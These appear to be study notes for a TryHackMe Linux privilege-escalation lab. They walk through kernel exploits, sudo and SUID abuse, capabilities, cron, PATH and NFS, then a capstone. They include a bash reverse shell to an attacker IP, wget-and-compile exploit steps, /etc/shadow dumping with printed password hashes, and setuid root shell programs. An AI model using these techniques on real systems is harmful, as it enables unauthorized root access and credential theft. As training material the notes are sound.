# TRYHACKME : LINUX PRIVILEGE ESCALATION

> NOTE from THM:Leave no privilege escalation vector unexplored, privilege escalation is often more an art than a science.

### Methods: 
- kernel exploit, 
- sudo, 
- capabilities, 
- SUID, 
- cron jobs, 
- PATH,
- NFS

## KERNEL EXPLOIT
lesson:
exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access

### machine:
```
(download exploit from exploitdb CVE2015-1328)
python3 -m http.server 9000
```

### target machine:
```
wget http://machineip:9000/37292.c
gcc 37292.c -o ofc
./ofc
cat /home/matt/flag1.txt
```

## SUDO 
lesson: 
System administrators may need to give regular users some flexibility on their privileges. You may use sudo -l to current user's root privileges. Also leverage application functions and LD_PRELOAD (env_keep is enabled).

```
sudo -l
cat /home/ubuntu/flag2.txt
sudo less /etc/shadow
(add !/bin/sh in the :)
cat /etc/shadow
```

## SUID 
lesson:
SUID (Set-user Identification) and SGID (Set-group Identification) can alter a users file interaction to execute with a file or group owner permission level. Nano, for ex, is owned by root, meaning we can read and edit files at a highe privilege level than our current user has. When used find / -type f -perm -04000 -ls 2>/dev/null and find nano with 's' as the SUID special permission. You can use John the ripper can luckily crack passwords with passwd and shadow. Or use openssl to create new user with root privileges.

```
cat /etc/passwd
find / -type f -perm 04000 -ls 2>/dev/null
(find GTFOBins: found base64)
LFILE=/etc/shadow
base64 "$LFILE" | base64 --decode
(use hashes.com and crack the user2 hash, copy user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
)
LFILE=/home/ubuntu/flag3.txt
base64 "$LFILE" | base64 --decode
```

## CAPABILITIES 
Lesson:
Capabilities help manage privileges at a more granular level. A system administrator can change the capabilities of the binary. Use getcap to list enabled capabilities.

```
getcap -r / 2>/dev/null
(search GTFOBins vim capabilities)
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
cd ../ubuntu
cat flag4.txt
```

## CRON JOBS 
Lesson:
Cron jobs are used to run, with the privilege of the owner, scripts or binaries at specific times. The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.

```
cat /etc/crontab
vim backup.sh
(add in the end: bash -i >& /dev/tcp/10.x.x.x/6666 0>&1)
chmod 777 backup.sh
./backup.sh
```

#### machine:
```
nc -lvnp 6666
cat ../home/ubuntu/flag5.txt
cat /etc/shadow
(crack matt:$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.:18798:0:99999:7:::)
```

## PATH 
Lesson:
If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. While PATH is the environmental variable.

    What folders are located under $PATH
    Does your current user have write privileges for any of these folders?
    Can you modify $PATH?
    Is there a script/application you can start that will be affected by this vulnerability?
```
find / -writable 2>/dev/null
vim test.c
gcc test.c -o test
(
#include <stdio.h>
#include <unistd.h>
void main()
{
setuid(0);
setgid(0);
system("thm");
}
)
echo $PATH
export PATH=/tmp:$PATH
cd /tmp
echo "/bin/bash" > thm
chmod 777 thm
cd ../home/murdoch
./test
cat ../matt/flag6.txt
```

## NFS 
Lesson:
Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

### Target machine:
```
cat /etc/exports
```

### machine:
```
sudo su
showmount -e TARGETIP
mkdir /mnt/sharedfolder
mount -o rw TARGETIP:/home/ubuntu/sharedfolder /tmp/sharedfolder
(create c file:
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main (void)
{
setgid(0);
setuid(0);
system("/bin/bash -p");
return 0;
}
)
gcc file.c -static -o file
chmod +s file
```

### target machine:
```
cd /home/ubuntu/sharedfolder
./file
cat /home/matt/flag7.txt
```

## CAPSTONE CHALLENGE 
**ENUMERATION:**
- username: leonard
- password: Penny123

- home folder: leonard, missy, rootflag
- kernel: Linux 3.10.0-1160.el7.x86_64

### 1. KERNEL EXPLOIT
**LEONARD**
```
cat /proc/version
(search for exploit for Linux version 3.10.0-1160.el7.x86_64)
(found CVE: 2018-14634)
//machine:
python3 -m http.server 9000
//target machine:
wget http://machineip:9000/45516.c
gcc 45516.c -static -o code
[experiencing error with the c code]
```

### 2. SUDO
**LEONARD**
```
sudo -l
[leonard cant run sudo]
```
**MISSY**
```
sudo -l
(no env_keep+=LD_PRELOAD)
(cant do sudo less /etc/shadow)
(cant do sudo sudo /bin/sh)
(NOPASSWD: /usr/bin/find)
sudo find . -exec /bin/sh \; -quit
cd /home/rootflag
cat flag2.txt
```

### 3. SUID
**LEONARD**
```
find / -type f -perm -04000 -ls 2>/dev/null
(GTFOBins: /usr/bin/base64)
LFILE=/etc/shadow
base64 "$LFILE" | base64 --decode
(crack missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::)
su missy
Password1
cat /home/missy/Documents/flag1.txt
```
